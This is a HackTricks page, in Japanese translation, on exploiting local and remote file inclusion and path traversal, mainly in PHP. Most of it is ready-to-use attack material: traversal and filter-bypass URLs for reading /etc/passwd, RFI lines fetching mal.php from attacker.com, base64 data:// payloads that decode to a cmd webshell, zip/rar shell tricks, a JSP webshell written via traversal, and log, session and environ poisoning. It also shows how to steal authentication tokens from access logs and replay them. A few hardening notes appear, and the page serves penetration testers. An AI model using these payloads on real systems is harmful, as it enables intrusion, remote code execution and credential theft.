# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** ファイルがリモートサーバから読み込まれます（ベストケース: あなたがコードを書き、サーバがそれを実行します）。phpではこれはデフォルトで**無効**です（**allow_url_include**）。\
**Local File Inclusion (LFI):** サーバがローカルファイルを読み込みます。

ユーザがサーバに読み込ませるファイルを何らかの方法で制御できる場合に、この脆弱性が発生します。

脆弱な **PHP functions**: require, require_once, include, include_once

この脆弱性を悪用するための便利なツール: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**複数の \*nix LFI リストを組み合わせ、さらにパスを追加してこれを作成しました：**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

また `/` を `\` に変更してみてください\
また `../../../../../` を追加してみてください

脆弱性が存在するか確認するために /etc/password を見つけるためのいくつかの手法を使用するリストは [こちら](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) にあります

### **Windows**

異なる wordlists のマージ：


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

また `/` を `\` に変更してみてください\
また `C:/` を削除して `../../../../../` を追加してみてください

脆弱性が存在するか確認するために /boot.ini を見つけるためのいくつかの手法を使用するリストは [こちら](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) にあります

### **OS X**

linux の LFI リストを確認してください。

## Basic LFI and bypasses

すべての例は Local File Inclusion 向けですが、Remote File Inclusion にも適用できます (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### トラバーサルシーケンスが非再帰的に削除される
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

提供された文字列の末尾に文字が追加される処理をバイパスする (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
これは **PHP 5.4 以降で解決されています**

### **エンコーディング**

非標準のエンコーディング（double URL encode など）を使用できます：
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### HTML-to-PDF SVG/IMG path traversal

モダンな HTML-to-PDF エンジン (例: **TCPDF** や **html2pdf** のようなラッパー) は、攻撃者が提供した HTML、SVG、CSS、フォントの URL を問題なく解析しますが、それらはファイルシステムにアクセスできる信頼されたバックエンドネットワーク内で動作します。`$pdf->writeHTML()`/`Html2Pdf::writeHTML()` に HTML を注入できるようになると、ウェブサーバーのアカウントが読み取れるローカルファイルを外部に持ち出すことがしばしば可能です。

- **Fingerprint the renderer**: 生成された PDF には必ず `Producer` フィールド（例: `TCPDF 6.8.2`）が含まれます。正確なビルドを知ることで、どのようなパスフィルタが存在するか、検証の前に URL デコードが行われるかを判断できます。
- **Inline SVG payloads**: `TCPDF::startSVGElementHandler()` は `<image>` 要素の `xlink:href` 属性を `urldecode()` を実行する前に読み取ります。悪意のある SVG を data URI 内に埋め込むと、多くの HTML サニタイザは payload を無視しますが、TCPDF はそれでも解析します:
```
<img src="data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMCAwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxpbWFnZSB4bGluazpocmVmPSIuLi8uLi8uLi8uLi8uLi90bXAvdXNlcl9maWxlcy91c2VyXzEvcHJpdmF0ZV9pbWFnZS5wbmciIGhlaWdodD0iMTAwJSIgd2lkdGg9IjEwMCUiLz48L3N2Zz4=" />
```
TCPDFは`/`で始まるパスに`$_SERVER['DOCUMENT_ROOT']`を先に付加し、`..`は後で解決するため、先頭に`../../..`セグメントか`/../../..`を使って付加後にルートを抜けてください。
- **Encoding to bypass naive filters**: バージョン ≤6.8.2 では URL をデコードする前にリテラルの部分文字列`../`のみをチェックします。SVG や生の`<img src>`属性に`..%2f`（または`..%2F`）を送るとチェックを回避できます。巡回のドット・ドット・スラッシュシーケンスは TCPDF が `urldecode()` を呼んだ後に初めて再現されるからです。
- **Double-encoding for multi-stage decoding**: ユーザー入力が web フレームワークと TCPDF の両方でデコードされる場合、スラッシュを二重にエンコード（`%252f`）します。1 回のデコードで `%2f` になり、TCPDF での 2 回目のデコードで `/` になり、`/..%252f..` → `/../../../…` となって、初期のフィルターに `../` を一度も見せずに済みます。
- **HTML `<img>` handler**: `TCPDF::openHTMLTagHandler()` は同じ順序のバグを含んでおり、`src="%2f..%252f..%252ftmp%252fsecret.png"` のような直接的な HTML ペイロードでローカルで到達可能なビットマップを読み取らせることができます。

この手法は PDF ワーカーが読み取れるもの（passport scans、API keys が画像としてレンダリングされたもの、など）をleaksします。Hardeners はパスを正規化する（`isRelativePath()`）ことで 6.9.1 で修正したため、テスト時は古い`Producer`バージョンを優先してください。

### From existent folder

Maybe the back-end is checking the folder path:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### サーバー上のファイルシステムディレクトリの探索

サーバーのファイルシステムは、特定の手法を用いることでファイルだけでなくディレクトリも再帰的に探索できます。この方法ではディレクトリの深さを判定し、特定のフォルダの存在を調査します。以下はその詳細な手順です:

1. **ディレクトリの深さを判定する:** 現在のディレクトリの深さは、`/etc/passwd` を正常に取得できるかで確認します（サーバーが Linux ベースの場合に適用）。例として、以下のような URL 構造は深さが三であることを示します:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Probe for Folders:** URLに疑わしいフォルダ名（例: `private`）を追加し、その後 `/etc/passwd` に戻ってアクセスします。追加のディレクトリレベルがあるため、depth を1つ増やす必要があります:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpret the Outcomes:** サーバーの応答はフォルダが存在するかどうかを示します:
- **Error / No Output:** 指定した場所に `private` フォルダは存在しない可能性が高い。
- **Contents of `/etc/passwd`:** `private` フォルダの存在が確認されます。
4. **Recursive Exploration:** 発見したフォルダは、同じ手法や従来の Local File Inclusion (LFI) 方法を使って、さらにサブディレクトリやファイルを調べることができます。

For exploring directories at different locations in the file system, adjust the payload accordingly. For instance, to check if `/var/www/` contains a `private` directory (assuming the current directory is at a depth of 3), use:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncationは、webアプリケーション内のファイルパスを操作するために用いられる手法です。通常、ファイルパスの末尾に追加の文字を付加するセキュリティ対策を回避してアクセス制限されたファイルに到達するために使われます。目的は、セキュリティ対策によって変更された後でも依然として目的のファイルを指すようなファイルパスを作成することです。

In PHP、ファイルシステムの性質上、ファイルパスのさまざまな表現が同等と見なされることがあります。例えば:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` はすべて同じパスとして扱われます。
- 最後の6文字が `passwd` の場合、`/` を追加して `passwd/` にしても対象のファイルは変わりません。
- 同様に、ファイルパスに `.php` が付いている（例: `shellcode.php`）場合、末尾に `/.` を追加してもアクセスされるファイルは変わりません。

以下の例は、path truncation を利用して `/etc/passwd` にアクセスする方法を示しています。`/etc/passwd` は機密性の高い内容（ユーザーアカウント情報）を含むため、一般的な標的です:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
これらのシナリオでは、必要なトラバーサル数は約2027回になることがありますが、この数はサーバの設定によって変動します。

- **ドットセグメントと追加文字の使用**: トラバーサルシーケンス（`../`）にドットセグメントや追加の文字を組み合わせることで、ファイルシステムを移動でき、サーバが付加する文字列を実質的に無視できます。
- **必要なトラバーサル数の決定**: 試行錯誤により、rootディレクトリに到達してから`/etc/passwd`にたどり着くために必要な正確な`../`の数を見つけることができ、サーバが付加する（例：`.php`）ような文字列を無力化しつつ、目的のパス（`/etc/passwd`）を保てます。
- **存在しないディレクトリで開始する**: パスを存在しないディレクトリ（例：`a/`）で始めるのは一般的な手法です。このテクニックは予防策として、またはサーバのパス解析ロジックの要件を満たすために使われます。

パストランケーション手法を用いる際は、サーバのパス解析の挙動やファイルシステムの構造を理解することが重要です。状況によって取るべきアプローチは異なり、最も有効な方法を見つけるにはテストが必要なことが多いです。

**この脆弱性はPHP 5.3で修正されました。**

### **フィルターバイパスのトリック**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

phpでは、これはデフォルトで無効になっています。なぜなら **`allow_url_include`** が **Off.** になっているからです。動作させるには **On** にする必要があり、その場合、あなたのサーバーからPHPファイルをincludeしてRCEを得ることができます:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
もし何らかの理由で **`allow_url_include`** が **On** で、しかし PHP が外部ウェブページへのアクセスを**filtering**している場合、[この投稿](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)によれば、例えば data protocol と base64 を使って b64 PHP コードをデコードし、 egt RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> 前のコードでは、最後の `+.txt` は攻撃者が `.txt` で終わる文字列を必要としていたため追加されました。文字列はそれで終わり、b64 decode の後、その部分は単なるジャンクを返し、実際の PHP コードが含まれて（したがって実行され）ます。

別の例 **`php://` プロトコルを使用しない** は次のとおりです：
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python ルート要素

pythonでは、次のようなコードの場合：
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
ユーザーが **絶対パス** を **`file_name`** に渡した場合、**以前のパスは単に削除されます**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
It is the intended behaviour according to [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> コンポーネントが絶対パスである場合、それ以前のすべてのコンポーネントは破棄され、結合はその絶対パスのコンポーネントから続行されます。

## Java ディレクトリ一覧

JavaでPath Traversalがある場合に、ファイルの代わりに**ディレクトリを要求すると**、**ディレクトリの一覧が返される**ようです。他の言語では（私の知る限り）このようなことは起きません。

## 上位25のパラメータ

以下は local file inclusion (LFI) 脆弱性の対象になり得る上位25のパラメータの一覧です（出典: [link](https://twitter.com/trbughunters/status/1279768631845494787））:
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI を使った PHP ラッパーとプロトコル

### php://filter

PHP filters は、データが読み書きされる前に基本的な **修正操作** を行うことを可能にします。フィルタには5つのカテゴリがあります:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: データからタグを削除する（"<" と ">" の間にあるすべての文字）
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : 別のエンコーディングに変換します（`convert.iconv.<input_enc>.<output_enc>`）。サポートされている **すべてのエンコーディングの一覧** を取得するにはコンソールで次を実行します: `iconv -l`

> [!WARNING]
> Abusing the `convert.iconv.*` conversion filter you can **generate arbitrary text**, which could be useful to write arbitrary text or make a function like include process arbitrary text. For more info check [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: コンテンツを圧縮する（大量の情報を外部に出力する場合に便利）
- `zlib.inflate`: データを展開する
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- その他のフィルタ
- phpで `var_dump(stream_get_filters());` を実行すると、いくつかの **予期しないフィルタ** が見つかります:
- `consumed`
- `dechunk`: HTTP の chunked encoding を逆変換する
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> 「php://filter」は大文字小文字を区別しません

### Using php filters as oracle to read arbitrary files

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) では、サーバーから出力を直接受け取らずにローカルファイルを読む手法が提案されている。この手法は **php filters をオラクルとして使ったファイルのブール式 exfiltration（1文字ずつ）** に基づいている。これは、php filters がテキストを十分に大きくして php に例外を投げさせるために使えるからである。

オリジナルの投稿には詳細な説明があるが、ここでは簡単な要約を示す：

- コーデック **`UCS-4LE`** を使ってテキストの先頭文字を残し、文字列のサイズを指数的に増加させる。
- これにより、先頭文字が正しく推測されたときに非常に大きなテキストが生成され、php が **error** を起こすようにする。
- **dechunk** フィルタは **先頭文字が16進数でない場合にすべてを削除する** ため、先頭文字が16進数かどうかを判別できる。
- これと前述の手法（および推測した文字に応じた他のフィルタ）を組み合わせることで、先頭の文字が16進数でなくなるまで十分な変換を行うタイミングを見て、テキスト先頭の文字を推測できる。なぜなら、もし16進数であれば dechunk は削除せず、初期の爆弾により php エラーが発生するからである。
- コーデック **convert.iconv.UNICODE.CP930** は各文字を次の文字に変換する（つまり a -> b）。これにより例えば先頭文字が `a` かどうかを判別できる。なぜならこのコーデックを6回適用すれば a->b->c->d->e->f->g となり、その文字はもはや16進数文字ではなくなり、dechunk は削除せず、初期の爆弾と掛け合わされて php エラーが発生するからである。
- 最初に **rot13** のような他の変換を使うことで、n, o, p, q, r のような別の文字をleakすることが可能（他のコーデックを使えば他の文字を16進数範囲に移せる）。
- 先頭が数字の場合は base64 エンコードが必要で、最初の2文字をleakしてその数字を判別する。
- 最後の問題は **how to leak more than the initial letter** である。convert.iconv.UTF16.UTF-16BE、convert.iconv.UCS-4.UCS-4LE、convert.iconv.UCS-4.UCS-4LE といった順序に関するメモリフィルタを使うことで、文字の順序を変更してテキスト中の別の文字を先頭に持ってくることが可能になる。
- さらにデータを取得するためのアイデアは、**convert.iconv.UTF16.UTF16** で先頭に **2 bytes of junk data** を生成し、**UCS-4LE** を適用してそれを次の2バイトと **pivot** させ、**ジャンクデータまでデータを削除する**（これにより初期テキストの最初の2バイトが削除される）。目的のビットをleakする位置に到達するまでこれを繰り返す。

記事ではこの処理を自動化するツールも公開されている： [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit)。

### php://fd

このラッパーはプロセスが開いているファイルディスクリプタにアクセスすることを可能にする。開かれているファイルの内容を外部に流出させるのに有用な可能性がある：
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
また、**php://stdin, php://stdout and php://stderr** を使って、それぞれ **file descriptors 0, 1 and 2** にアクセスできます（attackでどう役立つかは不明）

### zip:// and rar://

PHPShellを内包したZipまたはRarファイルをアップロードしてアクセスします.\
rar protocol を悪用できるようにするには、それが**明示的に有効化されている必要があります**
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
このプロトコルは php の設定 **`allow_url_open`** および **`allow_url_include`** によって制限されていることに注意してください

### expect://

Expect が有効になっている必要があります。以下のようにしてコードを実行できます:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POST parametersにpayloadを指定してください:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Webアプリケーションがファイル読み込みに `include` のような関数を使用している場合、`.phar` ファイルを利用してPHPコードを実行できます。  
下のPHPコードスニペットは `.phar` ファイルの作成例を示しています：
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` ファイルをコンパイルするには、以下のコマンドを実行してください：
```bash
php --define phar.readonly=0 create_path.php
```
実行すると、`test.phar` というファイルが作成され、Local File Inclusion (LFI) の脆弱性を悪用するために利用される可能性があります。

LFI が `file_get_contents()`、`fopen()`、`file()`、`file_exists()`、`md5_file()`、`filemtime()`、`filesize()` といった関数を通じて PHP コードを実行せずにファイルの読み取りのみを行う場合、`phar` プロトコルを用いたファイル読み取りに関連する deserialization vulnerability を悪用することが試みられます。  

`.phar` ファイルにおける deserialization vulnerability の悪用方法を詳しく理解するには、下のドキュメントを参照してください:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

php filters をサポートする PHP からの **any arbitrary file read** を悪用して RCE を取得することが可能でした。詳細は [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
簡単な要約: PHP ヒープの **3 バイトのオーバーフロー** が悪用され、特定サイズの空きチャンクのチェーンを **改変** して任意のアドレスに **任意のデータを書き込める** ようにし、`system` を呼ぶフックが追加されました。\
さらに、より多くの php filters を悪用して特定サイズのチャンクを割り当てることが可能でした。

### More protocols

より多くの可能な[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — メモリまたは一時ファイルに書き込む（file inclusion attack にどのように役立つかは不明）
- [file://](https://www.php.net/manual/en/wrappers.file.php) — ローカルファイルシステムへアクセス
- [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URL へアクセス
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URL へアクセス
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — 圧縮ストリーム
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — パターンに一致するパス名を検索（表示可能な出力を返さないため、ここではあまり有用ではない）
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — オーディオストリーム（任意ファイルの読み取りには役に立たない）

## LFI via PHP's 'assert'

'assert' 関数は文字列内のコードを実行できるため、PHP における Local File Inclusion (LFI) のリスクは特に高くなります。特に、".." のようなディレクトリトラバーサル文字を含む入力が検査されるが適切にサニタイズされていない場合に問題になります。

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
これはtraversalを防止することを目的としていますが、意図せずcode injectionのベクターを作成してしまいます。これを利用してファイルの内容を読み取るには、attackerは次のようなものを使用できます:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
同様に、任意のシステムコマンドを実行するには、次のように使用します:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> このテクニックは、**あなたが** **ファイルパス** を制御でき、**PHP function** がファイルにアクセスするが、そのファイルの内容が表示されない（例えば単純な **`file()`** の呼び出しのように）ケースに関連します。

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) では、blind path traversal が PHP filter を通じて悪用され、error oracle を介してファイルの内容を exfiltrate する方法が説明されています。

要約すると、この手法は **"UCS-4LE" encoding** を使用してファイルの内容を非常に**大きく**し、ファイルを開く **PHP function** が **エラー** を引き起こすようにします。

その後、最初の文字を leak するためにフィルタ **`dechunk`** が **base64** や **rot13** と共に使用され、最後に **convert.iconv.UCS-4.UCS-4LE** と **convert.iconv.UTF16.UTF-16BE** が使用されて先頭に他の文字を配置してそれらを leak します。

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

For the technical details check the mentioned post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

ファイルを受け取る/アップロードするサーバー側のコードが、保存先パスをユーザー制御のデータ（例: filename や URL）を使って正規化や検証を行わずに組み立てると、`..` セグメントや絶対パスが意図したディレクトリから脱出し、任意のファイル書き込みを引き起こす可能性があります。ペイロードを web-exposed ディレクトリに配置できれば、通常は webshell を配置して認証不要の RCE を得られます。

Typical exploitation workflow:
- パス/filename を受け取りディスクに内容を書き込む write primitive を持つエンドポイントやバックグラウンドワーカーを特定する（例: message-driven ingestion、XML/JSON コマンドハンドラ、ZIP extractors など）。
- web-exposed ディレクトリを特定する。一般的な例:
  - Apache/PHP: `/var/www/html/`
  - Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
  - IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- 意図したストレージディレクトリから webroot に抜け出す traversal パスを作成し、webshell の内容を含める。
- 配置したペイロードにブラウズしてコマンドを実行する。

Notes:
- 書き込みを実行する脆弱なサービスは非HTTPポートで待ち受けていることがある（例: TCP 4004 の JMF XML リスナー）。メインの web ポータル（別ポート）が後であなたのペイロードを配信する。
- Java スタックでは、これらのファイル書き込みは単純な `File`/`Paths` の連結で実装されていることが多い。正規化や allow-listing の欠如が根本的な欠陥である。

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Hardening that defeats this class of bugs:
- 正規化されたパスに解決し、allow-listed ベースディレクトリの子孫であることを強制する。
- `..`、absolute roots、またはドライブレターを含むパスを拒否する；生成されたファイル名を優先する。
- ライターを低権限アカウントとして実行し、書き込みディレクトリを配信ルートから分離する。

## Remote File Inclusion

前述のとおり、[**follow this link**](#remote-file-inclusion)。

### Via Apache/Nginx log file

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

> [!WARNING]
> シェルに **double quotes** を使うと **simple quotes** の代わりに、文字列 "_**quote;**_" に変換され、**PHP はエラーを発生させ**、**それ以外は実行されません**。
>
> また、ペイロードを**正確に書き込む**ことを確認してください。そうしないと、PHP はログファイルを読み込むたびにエラーを起こし、二度目のチャンスは得られません。

これは他のログでも可能ですが、**be careful,** ログ内のコードが URL エンコードされていると Shell が壊れることがあります。ヘッダ **authorisation "basic"** は Base64 で "user:password" を含み、ログ内でデコードされます。PHPShell はこのヘッダ内に挿入できる場合があります。\
Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### アクセスログを読み取り、GETベースの auth tokens を収集する（token replay）

多くのアプリは誤って session/auth tokens を GET 経由で受け付けます（例: AuthenticationToken, token, sid）。path traversal/LFI によって web server logs にアクセスできる場合、access logs からそれらの tokens を盗み出して replay することで認証を完全にバイパスできます。

How-to:
- traversal/LFI を使って web server access log を読みます。よくある場所:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- 一部の endpoints はファイル読み取りを Base64-encoded で返します。その場合はローカルでデコードしてログ行を確認します。
- grep で token パラメータを含む GET リクエストを検索して値を取得し、それをアプリケーションのエントリポイントに対して replay します。

Example flow (generic):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
本文が Base64 の場合はデコードし、キャプチャした token を replay する:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
Notes:
- URLs内のTokensはデフォルトでログに記録されます。production環境ではGET経由のbearer tokensを決して受け入れないでください。
- アプリが複数のtoken名をサポートしている場合、AuthenticationToken、token、sid、access_token のような一般的なキーを探してください。
- logsにleakedした可能性のあるtokenはすべてrotateしてください。

### Via Email

**Send a mail** を内部アカウント (user@localhost) に送り、`<?php echo system($_REQUEST["cmd"]); ?>` のような PHP payload を含めて、ユーザーのメール（例: **`/var/mail/<USERNAME>`** または **`/var/spool/mail/<USERNAME>`**）にincludeしてみてください。

### Via /proc/\*/fd/\*

1. 多数のshellをアップロードする（例えば: 100）
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) をincludeする。ここで $PID = プロセスの PID（can be brute forced）および $FD = ファイルディスクリプタ（can be brute forced too）

### Via /proc/self/environ

ログファイルのように、User-Agent にペイロードを送ると /proc/self/environ ファイル内に反映されます。
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### アップロード経由

ファイルをアップロードできる場合は、そこに shell payload を注入してください（例: `<?php system($_GET['c']); ?>`）。
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
ファイルを読みやすく保つため、pictures/doc/pdf のメタデータに注入するのが最適です

### Via Zip fie upload

PHP shell を含む ZIP ファイルをアップロードし、アクセス：
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP sessions を介して

ウェブサイトが PHP Session (PHPSESSID) を使用しているか確認する
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHPでは、これらのセッションは _/var/lib/php5/sess\\_\[PHPSESSID]\_ ファイルに保存されます。
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
cookie を `<?php system('cat /etc/passwd');?>` に設定してください
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
